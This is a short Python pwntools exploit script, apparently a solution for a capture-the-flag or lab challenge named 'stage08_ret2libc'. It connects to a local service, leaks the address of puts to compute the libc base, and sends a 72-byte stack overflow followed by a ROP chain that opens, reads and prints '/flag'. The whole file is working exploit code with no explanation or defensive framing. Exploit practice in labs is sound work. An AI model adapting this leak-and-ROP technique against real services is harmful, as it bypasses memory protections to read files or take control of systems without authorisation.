
from pwn import *
elf  = ELF('build/stage08_ret2libc', checksec=False)
libc = ELF('extracted/libc.so.6', checksec=False)

def leak_and_base(io):
    io.recvuntil(b':')
    io.sendline(b'LEAK')
    line = io.recvline().strip()      # b'PUTS=0x...'
    leaked = int(line.split(b'=')[1], 16)
    libc.address = leaked - libc.sym['puts']
    log.info(f'libc @ {hex(libc.address)}')

io = remote('127.0.0.1', 7108, timeout=5)
leak_and_base(io)

offset = 72
rop = ROP(libc)
# ORW('/flag') for deterministic output
rop.open(next(libc.search(b'/flag\x00')), 0)
bss = elf.bss() + 0x200
rop.read(3, bss, 0x100)
rop.write(1, bss, 0x100)

payload = b'A'*offset + rop.chain()
io.send(payload)
print(io.recvrepeat(1).decode(errors='ignore'))
